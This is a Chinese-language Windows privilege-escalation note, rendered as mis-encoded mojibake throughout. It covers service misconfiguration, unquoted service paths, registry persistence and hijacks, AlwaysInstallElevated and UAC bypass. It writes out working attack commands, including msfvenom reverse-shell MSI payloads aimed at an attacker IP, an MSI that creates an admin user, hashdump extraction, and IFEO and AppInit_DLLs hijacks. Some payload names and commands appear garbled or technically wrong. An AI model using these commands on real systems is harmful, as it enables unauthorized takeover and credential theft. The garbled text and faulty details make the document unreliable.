é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ1.ä¸å®‰å…¨çš„æœåŠ¡æƒé™æŸ¥è¯¢æœåŠ¡çš„é…ç½®ï¼š sc.exe qc name æŸ¥è¯¢æœåŠ¡çš„å½“å‰çŠ¶æ€ï¼š sc.exe query name ä¿®æ”¹æœåŠ¡çš„é…ç½®é€‰é¡¹ï¼š sc.exe config name option= value å¼€å§‹åœæ­¢æœåŠ¡ï¼š net start/stop name accesschk.exeç”¨æ³•ä»‹ç» å‘½ä»¤ æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å¯¹æ–‡ä»¶æ–‡ä»¶å¤¹çš„æƒé™ accesschk ç”¨æˆ·ç”¨æˆ·ç»„æ–‡ä»¶ä»¶å¤¹ åˆ—å‡ºæ‰€æœ‰æœåŠ¡çš„æƒé™ accesschk.exe -ucqv * æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å…·æœ‰å†™æƒé™çš„æœåŠ¡ accesschkç”¨æˆ·ç”¨æˆ·ç»„ -cw * è¦æŸ¥çœ‹ç”¨æˆ·ç”¨æˆ·ç»„å¯¹ HKEY LOCAL MACHINEã€Softwareç›®å½•ä¸‹æ³¨å†Œè¡¨é¡¹çš„æƒé™ accesschk-kç”¨æˆ·ç”¨æˆ·ç»„ hkl\\software æŸ¥çœ‹æ¯ä¸ªäººéƒ½å¯ä»¥ä¿®æ”¹çš„å…¨å±€å¯¹è±¡ accesschk -wuo everyone font - åå¼¹shell- ç”¨winPEASany.exe æ£€æŸ¥font style=color:rgb(36, 41, 47);æœåŠ¡é…ç½®é”™è¯¯ .\\winPEASany.exe quiet servicesinfo/font- font style=color:rgb(36, 41, 47);æŸ¥çœ‹æ˜¯å¦æœ‰æ‰‹å·¥ä¿®æ”¹çš„æœåŠ¡/font- font style=color:rgb(36, 41, 47);.\\accesschk.exe /accepteula -uwcqv user æœåŠ¡/font- font style=color:rgb(36, 41, 47);æ£€æŸ¥ç”¨æˆ·æˆ–ç»„æ˜¯å¦æœ‰æƒè®¿é—®æ–‡ä»¶ï¼Œç›®å½•ï¼ŒæœåŠ¡å’Œæ³¨å†Œè¡¨é¡¹/font- font style=color:rgb(36, 41, 47);sc qc æœåŠ¡ /font- font style=color:rgb(36, 41, 47);æ£€æŸ¥å½“å‰é…ç½®/font- font style=color:rgb(36, 41, 47);sc config /fontfont style=color:rgb(36, 41, 47);æœåŠ¡/fontfont style=color:rgb(36, 41, 47); binpath= \\C:\\Users\\user\\Desktop\\a002.exe\\ /font- font style=color:rgb(36, 41, 47);é‡æ–°é…ç½®æœåŠ¡ä½¿æˆ‘ä»¬åå‘shell/font- font style=color:rgb(36, 41, 47);net start /fontfont style=color:rgb(36, 41, 47);æœåŠ¡/font- font style=color:rgb(36, 41, 47);å¯åŠ¨æœåŠ¡è§¦å‘æ¼æ´åå¼¹shell/font 2.æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„1.è¿è¡ŒwinPEASä»¥æ£€æŸ¥æœåŠ¡é…ç½®é”™è¯¯ï¼š.\\winPEASany.exe quiet servicesinfo 2. å‘ç°â€unquotedsvcâ€æœåŠ¡æœ‰ä¸€ä¸ªæœªå¼•ç”¨çš„è·¯å¾„ ï¼Œå…¶ä¸­ä¹Ÿ åŒ…å« ç©ºæ ¼ï¼šC:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe 3. ä½¿ç”¨scç¡®è®¤æ­¤é—®é¢˜ï¼šsc qc unquotedsvc 4.ä½¿ç”¨accesschk.exeæ£€æŸ¥å†™å…¥æƒé™ï¼š.\\accesschk.exe /accepteula -uwdq C:\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\ 1. .\\accesschk.exe /accepteula -uwdq C:\\**åŠŸèƒ½ åŠŸèƒ½ï¼šæ‰«æ C ç›˜æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹å‚æ•°å«ä¹‰ï¼š/accepteulaï¼šè‡ªåŠ¨æ¥å—æœ€ç»ˆç”¨æˆ·è®¸å¯åè®®-uï¼šåªæ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„æƒé™-wï¼šåªæ˜¾ç¤ºæœ‰å†™å…¥æƒé™çš„é¡¹ç›®-dï¼šæ˜¾ç¤ºç›®å½•æƒé™-qï¼šé™é»˜æ¨¡å¼ï¼Œä¸æ˜¾ç¤ºæ¨ªå¹…2. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\åŠŸèƒ½ï¼šæ‰«æ Program Files ç›®å½•åŠå…¶å­ç›®å½•ç›®çš„ï¼šæ‰¾å‡ºå½“å‰ç”¨æˆ·åœ¨ Program Files ä¸­æœ‰å†™å…¥æƒé™çš„ä½ç½®3. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\åŠŸèƒ½ï¼šä¸“é—¨æ‰«æç‰¹å®šæœåŠ¡ç›®å½•ç‰¹ç‚¹ï¼šè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ç¤ºä¾‹ 5.å¤åˆ¶å¯æ‰§è¡Œçš„åå‘å¤–å£³å¹¶é€‚å½“é‡å‘½åcopy C:\\Users\\user\\Desktop\\a002.exe C:\\Program Files\\Unquoted Path Service\\Common.exe ç³»ç»Ÿä¼šæŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ï¼šC:\\Program.exeC:\\Program Files\\Unquoted.exeC:\\Program Files\\Unquoted Path.exeC:\\Program Files\\Unquoted Path Service\\Common.exe 6.å¯åŠ¨æœåŠ¡è§¦å‘æ¼æ´è¿›è¡Œåå¼¹shellnet start unquotedsvc 3.æ³¨å†Œè¡¨æƒé™å¼± ç”±äºæ³¨å†Œè¡¨æ¡ç›®å¯èƒ½å…·æœ‰ ACLï¼Œå¦‚æœ ACL é…ç½®é”™è¯¯ï¼Œå³ä½¿æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹æœåŠ¡ï¼Œä¹Ÿæœ‰å¯èƒ½ä¿®æ”¹æœåŠ¡çš„é…ç½® 4.ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œ5.msfæ”»å‡»æ¨¡å—éœ€è¦æå‰è·å–ä¸€ä¸ªsession exploitwindowslocalservice_permissions exploitwindowslocalunquoted_service_path æ³¨å†Œè¡¨Windows æ³¨å†Œè¡¨æ˜¯ä¸€ä¸ªåºå¤§çš„é…ç½®æ•°æ®åº“ï¼Œå­˜å‚¨äº†ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„é…ç½®ä¿¡æ¯ã€‚ç”±äºå…¶é‡è¦æ€§ï¼Œæ³¨å†Œè¡¨ä¸­çš„æ¼æ´ç»å¸¸æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚HKEY_CLASSES_ROOTï¼ˆHKCRï¼‰ï¼šå­˜å‚¨æ–‡ä»¶ç±»å‹å…³è”ã€COM å¯¹è±¡ç­‰ä¿¡æ¯ï¼Œç”¨äºå†³å®šç³»ç»Ÿå¦‚ä½•å¤„ç†ä¸åŒç±»å‹çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå½“åŒå‡»ä¸€ä¸ª.docx æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šä¾æ®æ­¤åˆ†æ”¯ä¸­çš„ä¿¡æ¯è°ƒç”¨ç›¸åº”çš„ç¨‹åºï¼ˆå¦‚ Wordï¼‰æ¥æ‰“å¼€å®ƒã€‚ HKEY_CURRENT_USERï¼ˆHKCUï¼‰ï¼šåŒ…å«å½“å‰ç™»å½•ç”¨æˆ·çš„ä¸ªæ€§åŒ–è®¾ç½®ï¼Œå¦‚æ¡Œé¢å¸ƒå±€ã€æµè§ˆå™¨ä¹¦ç­¾ã€åº”ç”¨ç¨‹åºåå¥½è®¾ç½®ç­‰ã€‚æ¯ä¸ªç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåŠ è½½å±äºè¯¥ç”¨æˆ·çš„æ­¤åˆ†æ”¯æ•°æ®ã€‚ HKEY_LOCAL_MACHINEï¼ˆHKLMï¼‰ï¼šå­˜å‚¨ä¸æœ¬åœ°è®¡ç®—æœºç›¸å…³çš„ç³»ç»Ÿè®¾ç½®ï¼Œè¿™äº›è®¾ç½®å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½ç”Ÿæ•ˆï¼ŒåŒ…æ‹¬ç¡¬ä»¶é…ç½®ã€è½¯ä»¶å®‰è£…ä¿¡æ¯ã€ç³»ç»ŸæœåŠ¡é…ç½®ç­‰ã€‚ä¾‹å¦‚ï¼Œå®‰è£…çš„æ‰“å°æœºé©±åŠ¨ç¨‹åºä¿¡æ¯å°±å­˜å‚¨åœ¨æ­¤åˆ†æ”¯ã€‚ HKEY_USERSï¼šåŒ…å«æ‰€æœ‰å·²ç™»å½•ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ï¼ŒHKCU å®é™…ä¸Šæ˜¯ HKEY_USERS ä¸‹å¯¹åº”å½“å‰ç™»å½•ç”¨æˆ·çš„å­é”®çš„æ˜ å°„ã€‚ HKEY_CURRENT_CONFIGï¼ˆHKCCï¼‰ï¼šå­˜å‚¨å½“å‰ç¡¬ä»¶é…ç½®æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯ç³»ç»Ÿåœ¨å¯åŠ¨æ—¶æ ¹æ®ç¡¬ä»¶è®¾å¤‡æƒ…å†µåŠ¨æ€ç”Ÿæˆçš„ã€‚ 1 è‡ªå¯åŠ¨é¡¹Windows å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨è¿è¡ŒæŸäº›æ³¨å†Œè¡¨é¡¹ä¸­çš„ç¨‹åºã€‚æ”»å‡»è€…å¯ä»¥æ·»åŠ æˆ–ä¿®æ”¹è¿™äº›é¡¹ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runâ€ v â€œMaliciousâ€ t REG_SZ d â€œC:\\malicious.exeâ€ f 2 æœåŠ¡é…ç½®ä¸­çš„ ImagePathæŸäº›æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›è·¯å¾„æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ v ImagePath t REG_SZ d â€œC:\\malicious.exeâ€ f ä¿®æ”¹åï¼Œé‡æ–°å¯åŠ¨æœåŠ¡ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼š sc stop VulnerableServicesc start VulnerableService 3 AlwaysInstallElevatedAlwaysInstallElevated æ˜¯ä¸€ç§å…è®¸éç®¡ç†å‘˜ç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œ MSI æ–‡ä»¶çš„è®¾ç½®ã€‚é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹ã€æ³¨å†Œè¡¨é¡¹ï¼Œå¯ä»¥æ£€æŸ¥è¯¥è®¾ç½®æ˜¯å¦å¯ç”¨ï¼š reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\\winPEASany.exe quiet windowscreds æŸ¥çœ‹æ˜¯å¦è®¾ç½®äº†ä¸¤ä¸ªæ³¨å†Œè¡¨å€¼ å¦‚æœè¯¥è®¾ç½®å¯ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œæ¶æ„ MSI æ–‡ä»¶ï¼š msiexec i malicious.msi msf use exploitwindowslocalalways_install_elevated(å…ˆåå¼¹shell) å¦‚æœå¤±è´¥äº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨MSFç”Ÿæˆ msiæ–‡ä»¶ç„¶åä¸Šä¼ ä¸Šå»è¿è¡Œå³å¯ msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.0.106 LPORT6789 -f msi -o payload.msi å»ºç«‹ä¸€ä¸ªæ–°çš„ç›‘å¬(ä¸Šé¢çš„é‚£ä¸ªä¼šè¯ä¸è¦å…³æ‰) å°†msiæ–‡ä»¶é€šè¿‡shellä¼ ä¸Šå» upload payload.msi execute â€œmsiexec.exe quiet qn i payload.msiâ€ åˆ›å»ºä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·é€šè¿‡æ¶æ„ MSI æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„æ–°ç”¨æˆ·ã€‚ä»¥ä¸‹æ˜¯åˆ›å»ºæ¶æ„ MSI æ–‡ä»¶çš„æ­¥éª¤ï¼š msfvenom -p windowsadduser USERhacker PASSPassword123 -f msi -o adduser.msi æ‰§è¡Œ MSI æ–‡ä»¶åˆ›å»ºæ–°ç”¨æˆ·ï¼š msiexec i adduser.msi è¿™ä¸ªå‘½ä»¤å°†åœ¨ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªåä¸º â€œhackerâ€ çš„ç”¨æˆ·ï¼Œå¹¶èµ‹äºˆç®¡ç†å‘˜æƒé™ã€‚ æå–æ•æ„Ÿä¿¡æ¯æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ª MSI æ–‡ä»¶ï¼Œç”¨äºæå–ç³»ç»Ÿä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç å“ˆå¸Œæˆ–æ³¨å†Œè¡¨é”®å€¼ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š msfvenom -p windowsgatherhashdump -f msi -o hashdump.msi æ‰§è¡Œ MSI æ–‡ä»¶æå–å¯†ç å“ˆå¸Œï¼š msiexec i hashdump.msi è¿™ä¸ªå‘½ä»¤å°†æå–ç³»ç»Ÿä¸­çš„å¯†ç å“ˆå¸Œï¼Œå¹¶å°†å…¶å‘é€åˆ°æŒ‡å®šçš„è¿œç¨‹æœåŠ¡å™¨ã€‚ è¿è¡Œ PowerShell è„šæœ¬æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ MSI æ–‡ä»¶è¿è¡Œå¤æ‚çš„ PowerShell è„šæœ¬ï¼Œä»¥æ‰§è¡Œå¤šæ­¥éª¤çš„æ”»å‡»ã€‚ä»¥ä¸‹æ˜¯åˆ›å»ºä¸€ä¸ªè¿è¡Œ PowerShell è„šæœ¬çš„æ¶æ„ MSI æ–‡ä»¶ï¼š msfvenom -p windowspowershell_exec -f msi -o ps_script.msi CMDâ€powershell -ExecutionPolicy Bypass -File C:\\malicious.ps1â€ æ‰§è¡Œ MSI æ–‡ä»¶è¿è¡Œ PowerShell è„šæœ¬ï¼š msiexec i ps_script.msi è¿™ä¸ªå‘½ä»¤å°†ä»¥ SYSTEM æƒé™è¿è¡ŒæŒ‡å®šçš„ PowerShell è„šæœ¬ã€‚ 4 æ³¨å†Œè¡¨é”®æƒé™æŸäº›æ³¨å†Œè¡¨é”®å¯èƒ½é…ç½®äº†ä¸å®‰å…¨çš„æƒé™ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·ä¿®æ”¹æˆ–åˆ é™¤è¿™äº›é”®ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ›´æ”¹ç³»ç»Ÿé…ç½®æˆ–æ¤å…¥æ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š icacls â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ grant Everyone:F ä¿®æ”¹æ³¨å†Œè¡¨é”®åï¼Œé‡æ–°å¯åŠ¨æœåŠ¡æˆ–ç³»ç»Ÿä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ 5 å®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€ï¼ˆSDDLï¼‰æ³¨å†Œè¡¨é¡¹çš„å®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€ï¼ˆSDDLï¼‰å­—ç¬¦ä¸²å®šä¹‰äº†è°å¯ä»¥è®¿é—®è¯¥é¡¹ã€‚æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ SDDL å­—ç¬¦ä¸²ä»¥è·å¾—å¯¹æŸäº›æ³¨å†Œè¡¨é¡¹çš„å®Œå…¨æ§åˆ¶æƒã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableServiceâ€ t REG_SZ v â€œSecurityâ€ d â€œD:(A;;GA;;;WD)â€ f æ­¤å‘½ä»¤å°†æ³¨å†Œè¡¨é¡¹çš„æƒé™è®¾ç½®ä¸ºå…è®¸æ‰€æœ‰ç”¨æˆ·å®Œå…¨æ§åˆ¶ã€‚ 6 ç¯å¢ƒå˜é‡åŠ«æŒWindows ç³»ç»Ÿä¸­çš„æŸäº›ç¯å¢ƒå˜é‡å€¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›å€¼æ¥åŠ«æŒç³»ç»Ÿè¡Œä¸ºã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environmentâ€ v â€œPathâ€ t REG_EXPAND_SZ d â€œC:\\malicious;%â€ f æ­¤å‘½ä»¤å°†ç¯å¢ƒå˜é‡ Path ä¿®æ”¹ä¸ºåŒ…å«æ¶æ„è·¯å¾„ï¼Œä»è€ŒåŠ«æŒç³»ç»Ÿä¸­è¿è¡Œçš„ç¨‹åºã€‚ 7 æ³¨å†Œè¡¨é’©å­æ”»å‡»è€…å¯ä»¥åœ¨æ³¨å†Œè¡¨ä¸­æ·»åŠ é’©å­ï¼Œä½¿å¾—å½“æŸäº›æ³¨å†Œè¡¨é¡¹è¢«è®¿é—®æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\target.exeâ€ v â€œDebuggerâ€ t REG_SZ d â€œC:\\malicious.exeâ€ f æ­¤å‘½ä»¤ä¼šä½¿target.exeåœ¨æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½å¯åŠ¨malicious.exeã€‚ 8 AppInit_DLLs æ³¨å…¥é€šè¿‡ä¿®æ”¹AppInit_DLLsæ³¨å†Œè¡¨é¡¹ï¼Œæ”»å‡»è€…å¯ä»¥å°† DLL æ³¨å…¥åˆ°æ‰€æœ‰è¿›ç¨‹ä¸­ï¼Œä»è€Œè·å¾—ç³»ç»Ÿæ§åˆ¶æƒã€‚ ç¤ºä¾‹ï¼š reg add â€œHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windowsâ€ v â€œAppInit_DLLsâ€ t REG_SZ d â€œC:\\malicious.dllâ€ f æ­¤å‘½ä»¤ä¼šåœ¨æ‰€æœ‰è¿›ç¨‹å¯åŠ¨æ—¶åŠ è½½malicious.dllã€‚ 9 å¯åŠ¨ä¸æ¢å¤è®¾ç½®æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç³»ç»Ÿçš„å¯åŠ¨ä¸æ¢å¤è®¾ç½®ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿå´©æºƒæ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç¤ºä¾‹ï¼š reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v AutoReboot /t REG_DWORD /d 0 /freg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v DumpFile /t REG_EXPAND_SZ /d C:\\malicious.dmp /f æ­¤å‘½ä»¤ä¼šå°†ç³»ç»Ÿå´©æºƒåçš„è½¬å‚¨æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸ºæ¶æ„æ–‡ä»¶ã€‚ é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ³¨å†Œè¡¨ä¸­çš„é…ç½®é”™è¯¯å’Œæƒé™æ¼æ´ï¼Œè¿›è¡Œæƒé™æå‡å’Œç³»ç»Ÿæ§åˆ¶ã€‚å®‰å…¨äººå‘˜åº”ç‰¹åˆ«æ³¨æ„æ³¨å†Œè¡¨çš„é…ç½®å’Œæƒé™ç®¡ç†ï¼Œä»¥é˜²èŒƒæ½œåœ¨çš„æ”»å‡»ã€‚ ç»„ç­–ç•¥ç»„ç­–ç•¥é¦–é€‰é¡¹postwindowsgathercredentialsgpp ç»•è¿‡UACå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚å¦‚æœç®¡ç†å‘˜ä¸å…è®¸æ›´æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œè¿™äº›æ›´æ”¹ï¼Œå¹¶ä¸”Windowsç³»ç»Ÿä¿æŒä¸å˜ã€‚ ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰ åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº DLLæ³¨å…¥ ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰ ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰ ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰ è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰ 1.ç™½åå•ä»€ä¹ˆæ˜¯UACç™½åå•ï¼Ÿæ“ä½œç³»ç»Ÿè‡ªå·±æœ‰ä¸€äº›è¿›ç¨‹åœ¨è¿è¡Œçš„æ—¶å€™ä¸éœ€è¦é€šè¿‡éªŒè¯å°±ç›´æ¥å¯ä»¥è¿è¡Œï¼Œè¿™äº›ç¨‹åºåœ¨UACç™½åå•ä¸­ï¼Œæ¯”å¦‚ï¼šslui.exe.taskmgr.exeç­‰ã€‚ å½“è¿™äº›ç¨‹åºè¿è¡Œçš„æ—¶å€™å¯ä»¥é€šè¿‡DLLåŠ«æŒï¼ŒDLLæ³¨å…¥æˆ–è€…æ³¨å†Œè¡¨åŠ«æŒç­‰ ç»•è¿‡DLLå»æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºã€‚ è¿™é‡Œä¸¾ä¾‹æ³¨å†Œè¡¨åŠ«æŒï¼š é¦–å…ˆä½¿ç”¨å·¥å…·æ‰¾å‡ºç™½åå•çš„ç¨‹åºã€‚åœ¨UACç™½åå•ä¸­çš„ç¨‹åºéƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œå°±æ˜¯Mainfestæ•°æ®ä¸­çš„autoElevateå±æ€§çš„å€¼ä¸ºTrueã€‚ strings.exe å¯ä»¥æ£€æµ‹ç¨‹åºæ˜¯å¦æœ‰autoElevate å±æ€§ï¼Œä»è€Œæ‰¾å‡ºç™½åå•çš„ç¨‹åºï¼š strings.exe /accepteula -s C:\\windows\\system32\\*.exe | findstr /i aotoElevate å‡å¦‚ComputerDefaults.exe è¿›ç¨‹ï¼š æ‰“å¼€è¿™ä¸ªexe,æ²¡æœ‰éªŒè¯ç›´æ¥è¿›å…¥é»˜è®¤åº”ç”¨ç•Œé¢ã€‚ é€šè¿‡è¿›ç¨‹ç›‘æ§ åˆ†æè¯¥è¿›ç¨‹ä¼šå‘ç°ï¼Œå®ƒä¼šå…ˆå»è®¿é—®HKCU\\Software\\Classes\\ms-settings\\shell\\open\\commandï¼Œå‘ç°æ²¡ä¸œè¥¿åå†å»è®¿é—® HKCR\\ms-settings\\Shell\\Open\\Command\\DelegateExecute. ç„¶åæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒHKCU\\Software\\Classes\\ms-settings\\shell\\open\\command ä¸­çš„é»˜è®¤å€¼å’Œ DelegateExecute reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\windows\\system32\\cmd.exe #å¯ä»¥æ˜¯æ”»å‡»è½½è·çš„è·¯å¾„ã€‚reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d C:\\windows\\system32\\cmd.exe 2.DDLåŠ«æŒä»€ä¹ˆæ˜¯DLLåŠ«æŒï¼Œç¨‹åºé€šå¸¸å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¢«åˆ†å‰²æˆä¸€äº›DLLæ–‡ä»¶ã€‚å½“åº”ç”¨ç¨‹åºåŠ è½½DLLæ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šDLLçš„ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šä»¥ç‰¹å®šçš„é¡ºåºå»éå†æœç´¢åŠ è½½çš„DLLï¼Œå¦‚æœå°†åŒåçš„æ¶æ„çš„DLLæ–‡ä»¶æ”¾åœ¨çœŸæ­£çš„DLLä¹‹å‰ï¼Œé‚£ä¹ˆå°±ä¼šè¢«åŠ«æŒã€‚è¿™å°±æ˜¯åŠ«æŒã€‚ ä½†æ˜¯è¿™å‰ææ˜¯è¿™ä¸ªéå†ç›®å½•å¯å†™ã€‚è¿™ä¸ªç›®å½•é€šå¸¸åˆä¸å¯å†™ã€‚æ‰€ä»¥è¿™ä¸ªæŠ€æœ¯é€šå¸¸å’Œæ¨¡æ‹Ÿå¯ä¿¡ä»»æŠ€æœ¯æ¥é…åˆä½¿ç”¨ã€‚ æ‰€ä»¥æå‡ºä¸‹é¢è¿™ä¸ª æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½• 3.æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¹‹å‰è¯´äº†UACç™½åå•ä¸­çš„ç¨‹åºçš„manifest æ•°æ®ä¸­çš„autoElevateä¸ºtrueï¼Œå½“æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸ä½†è¦æ£€æŸ¥è¿™ä¸ªæ¡ä»¶ï¼Œè¿˜è¦æ£€æŸ¥è¿™ä¸ªç¨‹åºæ˜¯å¦åœ¨å¯ä¿¡ä»»ç›®å½•Cï¼š\\windows\\system32ä¸­ã€‚ä¸¤è€…ç¼ºä¸€ä¸å¯ã€‚ä½†æ˜¯å½“ç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œä¼šè‡ªåŠ¨å»é™¤è·¯å¾„ä¸­çš„ç©ºæ ¼ã€‚æ¯”å¦‚ â€C:\\Windows \\system32â€ ä¼šè¢«è§£ææˆ â€œC:\\windows\\system32â€ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªâ€C:\\Windows \\system32â€ç›®å½•ï¼ŒæŠŠç™½åå•ä¸­çš„ç¨‹åºå¤åˆ¶è¿›è¿™ä¸ªå«ç©ºæ ¼çš„ç›®å½•ä¸­ã€‚å†æŠŠæ¶æ„DLLæ–‡ä»¶æ”¾åˆ°è¿™ä¸ªæ¨¡æ‹Ÿçš„å¯ä¿¡ä»»ç›®å½•ä¸­ã€‚ç„¶åè¿è¡Œè¿™ä¸ªæ¨¡æ‹Ÿç›®å½•ä¸­çš„å¯æ‰§è¡Œç¨‹åºã€‚å°±ä¼šè¾¾åˆ°ç»•è¿‡UAC 